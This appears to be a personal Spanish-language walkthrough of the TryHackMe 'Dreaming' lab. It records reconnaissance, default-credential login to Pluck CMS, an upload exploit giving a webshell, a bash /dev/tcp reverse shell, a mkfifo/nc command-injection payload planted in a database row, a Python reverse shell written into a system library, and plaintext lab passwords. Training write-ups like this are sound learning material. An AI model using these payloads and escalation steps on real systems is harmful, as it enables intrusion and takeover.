# Dreaming
- THM
- 10.130.178.56  y nmap -sCV -Pn 10.130.178.56
- 22 y 80 http
- ❯ ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt para ver que rutas hay en la web.
- encuentro con ❯ ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -> /app 301 redirigido permanentemente y index.html
- EN app encuentro -> pluck-4.7.13/	2020-01-29 08:55 	-> http://10.130.178.56/app/pluck-4.7.13/?file=dreaming -> pruebo pero lo bloquea -> http://10.130.178.56/app/pluck-4.7.13/?file=../../../../etc/passwd
- ❯ ffuf -u http://10.130.178.56/app/pluck-4.7.13/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -> admin.php, data , docs, files, images,index.php, robots.txt
- pluckcms common passwords para probar en el panel http://10.130.178.56/app/pluck-4.7.13/login.php -> admin, password (correcta)
- Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) CVE-2020-29607-Exploit
- python3 49909.py 10.130.178.56 80 password /app/pluck-4.7.13 -> ip , contraseña ,ruta donde está instalado Pluck CMS
- Authentification was succesfull, uploading webshell -> Uploaded Webshell to: http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar
- http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar accedemos y tenemos una shell -> p0wny@shell:â¦/pluck-4.7.13/files# whoami www-data
- nc -lvnp 4444 -> bash -c 'bash -i >& /dev/tcp/192.168.132.185/4444 0>&1' y nos enviamos la shell.
- script /dev/null -c bash + ctrl z + stty raw -echo; fg -> reset export TERM=xterm export SHELL=bash stty rows 40 columns 120 y listo :) a operar.
- death  lucien  morpheus  ubuntu vemos estos usuarios
- Busco por contraseñas en cada directorio personal y demás no enucentro nada procedo a enumerar mas cosas
- y en directorio opt veo -> -rwxr-xr-x  1 lucien lucien  483 Aug  7  2023 test.py -> password = "HeyLucien#@1999!"

- # MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

- ssh lucien@10.130.178.56
- con sudo -l veo que -> User lucien may run the following commands on ip-10-130-178-56: (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
- sudo -u death python3 /home/death/getDreams.py -> y se ejecuta el script que vemos:

Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

- El script parece una copia segun lo que salga de getDreams.py
- Vemos que en el historial de cat $HOME/.bash_history hay un comando ->  mysql -u lucien -plucien42DBPASSWORD
- Vemos la tabla que lee el script y insertamos INSERT INTO dreams (dreamer, dream) VALUES ('s4cript', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.185 4444 >/tmp/f)'); para que ejecute
- sudo -u death /usr/bin/python3 /home/death/getDreams.py
- Conseguimos la shell siendo death y pillamos flag.
- Le paso linpeas y veo que hay /usr/lib/python3.8/shutil.py writable by death group.
- echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /usr/lib/python3.8/shutil.py
- nc -lvnp 9003
- y listo cat /home/morpheus/morpheus_flag.txt :)
